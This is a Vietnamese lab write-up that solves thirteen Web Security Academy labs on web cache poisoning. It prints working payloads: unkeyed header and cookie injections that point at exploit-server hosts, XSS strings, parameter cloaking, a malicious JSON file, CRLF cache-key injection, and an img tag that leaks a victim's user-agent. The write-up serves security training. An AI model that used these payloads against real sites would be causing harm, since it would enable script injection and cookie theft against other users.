# Nguyễn Văn Thọ - Web Cache Poisoning


### Bài 1: Web cache poisoning with an unkeyed header

>![](https://i.imgur.com/JwrXOH3.png)

Bài lab chứa lỗ hổng web cache poisoning vì nó handles các request header theo cách không an toàn. Tìm cách đầu độc bộ đệm để nó trả về response khiến execute alert(document.cookie).

Tức là việc xử lý request header khiến trang web bị XSS, mà header đó không được `key`, để khai thác nó trên người dùng khác, ta cần đầu độc bộ đệm.

Ở response của trang web, ta thấy có trường `X-Cache`, có nghĩa là trang web đang sử dụng một bộ đệm.

>![](https://i.imgur.com/KoAHt9J.png)

Chỉ cần gửi cùng một request vài lần liên tiếp là ta có thể chuyển giá trị của nó từ `miss` thành `hit` (response đã được lưu trong bộ đệm).

Dùng `param miner` trên burp suite, ta phát hiện header `x-forwarded-host` có thể bị khai thác

>![](https://i.imgur.com/qQg5YrX.png)

Thêm trường `x-forwarded-host` vào request gửi đi, ta thấy nó reflect trong 1 url.

>![](https://i.imgur.com/cY5G72x.png)


Ta tiến hành truyền đường dẫn đến exploit-server của ta để khi trang web nạp script sẽ bị khai thác.

Payload:

```
X-Forwarded-Host: exploit-0a8300a103c4284ec073761301de003f.exploit-server.net
```

Gửi request vài lần để đầu độc bộ đệm, khi user khác truy cập thì script sẽ được thực thi.

Kết quả:

>![](https://i.imgur.com/FXTobdG.png)

<hr>

### Bài 2: Web cache poisoning with an unkeyed cookie

>![](https://i.imgur.com/9wH6chs.png)

Bài lab chứa lỗ hổng Web Cache Poisoning vì nó không bao gồm cookies trong cache key, dẫn đến người dùng có thể đầu độc bộ đệm các response trả về cho user khác.

Quét với `param miner` ta thấy tham số sau có thể dùng để khai thác

>![](https://i.imgur.com/wDmpOjV.png)

Tìm kiếm và ta phát hiện tham số này nằm trong cookie, gửi request với cookie `fehost` có giá trị bất kì, ta thấy nó được trả về trong response.

>![](https://i.imgur.com/lNdGtOc.png)

Tuy nhiên server không thực hiện thêm cookie vào cache key, dẫn đến nó có thể bị đầu độc và các user khác bị ảnh hưởng

Payload

```
Cookie: fehost=abcdef"-alert(1)-""
```

Kết quả:

>![](https://i.imgur.com/da1xJ3S.png)


<hr>

### Bài 3: Web cache poisoning with multiple headers

>![](https://i.imgur.com/Qka3ob5.png)

Bài lab chứa lỗ hổng web cache poisoning và chỉ được khai thác khi ta tận dụng nhiều header 1 lúc để đầu độc bộ đệm

>![](https://i.imgur.com/6sJXTU0.png)

Thêm trường này vào request gửi đi tới `//resources/js/tracking.js` để lấy tài nguyên, ta thấy request trả về mã 302 thay vì 200, redirect tới đường dẫn như hình sau:

>![](https://i.imgur.com/rv9jiK7.png)

Thêm vào trường X-Forwarded-Host, request thay đổi sang host mà ta cung cấp.

>![](https://i.imgur.com/xG8dZpq.png)

Ta sửa lại để poison đường dẫn redirect bằng đường dẫn tới exploit server để load script về, ta khai thác thành công

>![](https://i.imgur.com/zrIjO6C.png)


<hr>

### Bài 4: Targeted web cache poisoning using an unknown header

>![](https://i.imgur.com/CWecE58.png)

Sử dụng `param miner` ta thấy trường `X-Host` có thể khai thác poisoning

>![](https://i.imgur.com/Qx270Pf.png)

Thêm X-Host với giá trị ngẫu nhiên trong request, ta thấy phản hồi có bao gồm nó trong 1 thẻ script

>![](https://i.imgur.com/UYJjQb1.png)

Sử dụng exploit server khai thác như các bài trên, ta thấy trigger thành công alert ở phía ta, tuy nhiên không solve được bài lab.

Chú ý phản hồi của trang web, ta thấy có trường `Vary` với giá trị `user-agent`. Tìm hiểu ta thấy trường này là dùng để chỉ định `user-agent` bao gồm trong cache key.

Ta cần tìm kiếm để biết được user-agent của victim trước khi poisoning cache.

Comment một thẻ html để khi victim truy cập ta sẽ lấy được user-agent của họ:

```htmlembedded!
<img src="https://exploit-0a91001903d9f734c01d3568012b006b.exploit-server.net/foo" >
```

Kết quả:

>![](https://i.imgur.com/YeZW20Y.png)

Thay user-agent trong request poisoning, ta attack thành công.

>![](https://i.imgur.com/ybiV6UF.png)


<hr>

### Bài 5: Web cache poisoning via an unkeyed query string

>![](https://i.imgur.com/Qi31Dq1.png)

Dùng `Pragma: x-get-cache-key` trong request gửi đi, ta thấy, Cache key chỉ gồm đường dẫn

>![](https://i.imgur.com/VEJDTjj.png)

Thử thêm tham số vào đường dẫn, ta thấy nó được reflect trong phản hồi.

>![](https://i.imgur.com/ezIyD2D.png)

Đoán rằng tham số này không nằm trong cache key,

Poison với payload sau để XSS

Payload:

```
abc='/><script>alert(1)</script>
```

Kết quả:

>![](https://i.imgur.com/bPuxOM4.png)


<hr>

### Bài 6: Web cache poisoning via an unkeyed query parameter

>![](https://i.imgur.com/2th6cp7.png)

Bài này ta cũng phát hiện lỗ hổng XSS ở query string như bài trên, tuy nhiên chỉ khai thác được ở phía ta, nghĩa là không đầu độc bộ đệm được, server từ chối cache các tham số rác.

Ta cần tìm các tham số có sẵn để đầu độc thay vì tạo ra các tham số ngẫu nhiên.

Tìm hiểu ta thấy có thể tận dụng các UTM parameters để đầu độc trang web (trang web sử dụng UTM params cho mục đích marketing)

```
?utm_content='/><script>alert(1)</script>
```

>![](https://i.imgur.com/A9POCcI.png)

<hr>

### Bài 7: Parameter cloaking

>![](https://i.imgur.com/ra7q2Bz.png)

Ở bài này ta cần tìm điểm khai thác trước, XSS ở tham số như cũ không còn khả dụng vì server đã encode output. Tuy nhiên quan sát ta thấy vẫn poisoning cache với tham số `utm_content` được.


Chú ý ta thấy trang web load thêm cả script từ `/js/geolocate.js?callback=setCountryCookie` để thực thi callback function truyền vào.

Sửa tham số `callback` để poison thì thấy nó đã bị thêm vào cache keyed, ta chỉ có thể exploit chính mình.

Mục tiêu là thay đổi giá trị của tham số `callback` bằng hàm `alert(1)`, việc dùng 1 tham số `callback` thứ 2 với giá trị `alert(1)` nhưng thấy khai thác không thành công.

Phần lý thuyết có gợi ý về việc các server `Ruby on Rails` nhận dấu `;` để tách các params với nhau, ta thử dùng nó để ghi đè giá trị tham số `callback`. Tận dụng thêm cả tham số UTM mà đã có được ở trên (không bị key cache), ta có payload như sau

Payload:

```!
/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

>![](https://i.imgur.com/sMmE88V.png)

<hr>

### Bài 8: Web cache poisoning via a fat GET request

>![](https://i.imgur.com/Z8ocDzK.png)

Bài này, phía server đã không còn sử dụng `Ruby on rails` framework, ta cần tìm điểm có thể poison cache khác. 

Kiểm tra tài liệu tham khảo, ta thấy có thể truyền tham số dưới phần body của GET request. Vì cache chỉ key đường dẫn cùng tham số trên URL, nên ta có thể khai thác như vậy để thay đổi giá trị tham số mà không tác động lên URL. Trong một số trường hợp server lấy giá trị tham số từ body sẽ dẫn đến có thể khải thác web cache poisoning như bài này.

```
Thêm vào body request: callback=alert(1)
```

>![](https://i.imgur.com/KUEZhCa.png)

<hr>

### Bài 9: URL normalization

>![](https://i.imgur.com/PhuTXvI.png)

Khi truy cập url không tồn tại, trang web sẽ trả về như sau

>![](https://i.imgur.com/zD7iyiF.png)

Thử khai thác reflected XSS nhưng payload đã bị trình duyệt url encode trước khi gửi đi và lúc trả kết quả về, server không thực hiện decode (`/</p><script>alert(1)</script><p>`)

>![](https://i.imgur.com/eE5nIIn.png)

Ta đoán rằng trên bộ nhớ đệm `/%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cp%3E` và `/</p><script>alert(1)</script><p>` đều trả về cùng một kết quả nếu server thực hiện key cache 1 chuỗi đã `normalize`

Dùng repeater của burp để tránh bị url-encode, ta cố gắng đầu độc cache với payload XSS, khi người dùng truy cập với `/%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cp%3E` sẽ bị XSS (lúc này cache trả về các đoạn mã exploit của ta [không  bị url encode])

>![](https://i.imgur.com/l1h4Z2O.png)


<hr>

### Bài 10: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

>![](https://i.imgur.com/EVLq93k.png)

Fuzzing ta thấy header X-Forwarded-Host được lấy để thêm vào giá trị của biến data

>![](https://i.imgur.com/dinAVkh.png)

Biến này sau đó được truyền vào hàm `initGeoLocate`

>![](https://i.imgur.com/XsXZWl5.png)

Kiểm tra hàm initGeoLocate, ta thấy nó fetch dữ liệu về và đưa vào DOM 1 cách không an toàn.

>![](https://i.imgur.com/HQdGeLx.png)

Tạo 1 json trên server để khai thác XSS như sau:

```
{"country": "<img src=1 onerror=alert(document.cookie)>"}
```

Lưu nó trên exploit server và truyền host của ta vào `X-Forwarded-Host` để poison biến data và khai thác XSS như đã giải thích

Kết quả.

>![](https://i.imgur.com/wTk2yt7.png)


<hr>

### Bài 11: Combining web cache poisoning vulnerabilities

>![](https://i.imgur.com/hiPBQsm.png)

Cũng giống như bài trước, bài này, `X-Forwarded-Host` được reflected trong biến host.

>![](https://i.imgur.com/hR8A4gC.png)

Kiểm tra thêm với param miner, ta thấy ngoài ra còn header `X-Original-URL` cũng có thể dùng để khai thác

>![](https://i.imgur.com/ahA1Ysl.png)

Biến data.host sẽ được truyền vào hàm `initTranslations`

>![](https://i.imgur.com/klyIRQR.png)

Hàm này sau đó thực hiện load JSON từ url xây dựng được để lấy data về ngôn ngữ, sau đó sẽ nhét vào DOM gây XSS

Ý tưởng là tạo một file json độc hại trên exploit server, sau đó poison host để server load payload về.

```json!
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
```

Tuy nhiên đoạn javascript trên chỉ xử lý với các ngôn ngữ khác tiếng Anh, nên ta cần tìm cách poison đường dẫn tới trang `home` sao cho tự động set ngôn ngữ sang thứ tiếng khác. 

Nhớ lại ta tìm đc X-Original-URL lúc đầu, ta có thể sử dụng nó để ghi đè đường dẫn `/` với `/setlang\es` để tự động set home page sang tiếng Espanol.

Do đó, khi người dùng load trang chủ, nó sẽ bị poison và set ngôn ngữ thành tiếng Espanol, tiếp đó vì ta đã poison cả biết data.host, nên nó sẽ load json độc hại từ exploit server của ta về và nhét payload vào DOM, kích hoạt XSS.

>![](https://i.imgur.com/DPcmLm0.png)

<hr>

### Bài 12: Cache key injection

>![](https://i.imgur.com/PUYftNB.png)

Trong response trả về, ta thấy `Vary: Origin` nghĩa là server thêm trường `Origin` vào key cache

>![](https://i.imgur.com/tVtWhvp.png)

Thử dùng header `Pragma: x-get-cache-key` ta thấy như sau:

>![](https://i.imgur.com/E7wP7Ut.png)

Nghĩa là các key cache phân cách với nhau bằng dấu`$$`

Nếu ta sửa trường `Origin` với giá trị có `$$` là có thể tiêm 1 cache key vào.

Ta tạo Origin như sau để tiêm và sửa response

```
x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

>![](https://i.imgur.com/Z9fArto.png)

Để lấy cache này, ta phải GET tới giá trị cache key như trong hình

```!
/js/localize.js?lang=en?cors=1&x=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

Quay lại trang login, ta thấy nó tự redirect tới `/?lang=en` và giá trị của `lang` được truyền vào đường dẫn đến việc load script

>![](https://i.imgur.com/jQ3Wym7.png)

Kiểm tra thêm, thấy tham số `utm_content` không được thêm vào cache key, có thể dùng nó để poison cache trong trang `/` để nó thay vì redirect tới `/?lang=en` thì redirect tới đường dẫn mong muốn.

>![](https://i.imgur.com/SKJgmj1.png)

Khi poison cho nó truy cập tới đường dẫn 
```!
https://0acf001804f2fa16c33fa6630020009c.web-security-academy.net/login/?lang=en?utm_content=x&cors=1&x=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$%23
```

>%23 để comment `&cors=0`có sẵn trong link load script như thảo luận dưới đây

Thì giá trị của `lang` được reflect trong đường dẫn tới việc load script và đường dẫn đó sẽ là

```!
/js/localize.js?lang=en?cors=1&x=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$#&cors=0
```

Đây lại là đường dẫn trong cache key đến trang script được ta đầu độc nội dung như đã thảo luận ở trên, do đó sẽ trả về `alert(1)`


>![](https://i.imgur.com/26glnfA.png)

<hr>

### Bài 13: Internal cache poisoning

>![](https://i.imgur.com/9vzdFaC.png)

Dùng `Param miner` ta thấy trường `X-Forwarded-Host` có thể được dùng để khai thác

>![](https://i.imgur.com/a1CgojN.png)

Thêm nó vào http request, ta thấy nó được reflect trong response ở đường dẫn load script và canonical link

>![](https://i.imgur.com/qmO9Ixg.png)

Tuy nhiên trong vài lần thử khác, ta chỉ thấy nó được reflect ở 2 vị trí

>![](https://i.imgur.com/BRkCeeT.png)

Tức là chỉ `fragment` này được cache (bởi internal cache)

lúc bỏ header `X-Forwarded-Host` đi, chỉ có đoạn script load từ `/js/geolocate.js` vẫn bị cache, 2 vị trí reflect phía trên không ảnh hưởng, vậy `X-Forwarded-Host` là cache key với External cache, nhưng không phải là cache key của Internal cache

Chỉnh sửa giá trị trường này trỏ đến exploit server, trên server lưu đoạn js độc hại, và poison internal cache, cho đến khi đường dẫn đã đc lưu vào cache, lúc này bất cứ người dùng nào truy cập đến trang đều bị ảnh hưởng bởi script của ta.

>![](https://i.imgur.com/qsq133b.png)

<hr>